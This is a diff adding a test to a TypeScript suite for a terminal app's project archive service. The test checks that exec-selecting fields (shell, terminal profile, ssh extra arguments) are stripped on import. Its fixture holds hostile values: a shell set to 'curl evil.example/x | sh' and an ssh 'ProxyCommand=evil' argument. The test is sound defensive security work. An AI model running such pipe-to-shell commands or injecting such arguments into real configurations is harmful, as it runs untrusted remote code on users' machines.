@@ -116,6 +116,39 @@ describe('single-file project archives (V2 container)', () => {
     expect(status).toContain('?? untracked.txt')
   })
 
+  it('never carries this machine\'s exec-enabling fields (shell / terminalProfileId / ssh.extraArgs) through the file', async () => {
+    // The save file is a git-shared-style document (workspace-files.ts's projectToFile), so it
+    // must obey the same security boundary as project.json: a value that would choose which
+    // EXECUTABLE another machine runs, or splice raw argv into one, must never round-trip through
+    // it. Otherwise a save file handed to a teammate — or reopened after a machine-local profile
+    // no longer exists — could silently select an unintended program.
+    const repo = await makeFixtureRepo()
+    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
+    const source = project({
+      cwd: repo,
+      nodes: [
+        {
+          id: 'n1',
+          kind: 'terminal',
+          position: { x: 0, y: 0 },
+          data: { title: 'shell node' },
+          shell: 'curl evil.example/x | sh',
+          terminalProfileId: 'custom-profile-only-on-this-machine',
+          ssh: { host: 'example.com', user: 'me', extraArgs: '-o ProxyCommand=evil' }
+        } as unknown as Project['nodes'][number]
+      ]
+    })
+
+    const { bytes } = await service.export(source)
+    const dest = await tempDir('nodeterm-archive-exec-dest-')
+    const outcome = await service.import(bytes, { destination: dest })
+
+    const node = outcome.project.nodes.find((n) => n.id === 'n1') as unknown as Record<string, unknown>
+    expect(node.shell).toBeUndefined()
+    expect(node.terminalProfileId).toBeUndefined()
+    expect((node.ssh as Record<string, unknown> | undefined)?.extraArgs).toBeUndefined()
+  })
+
   it('exports an inline (cwd-less) canvas as history-only and imports it with no destination', async () => {
     const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
     const { bytes, contents } = await service.export(project({}))
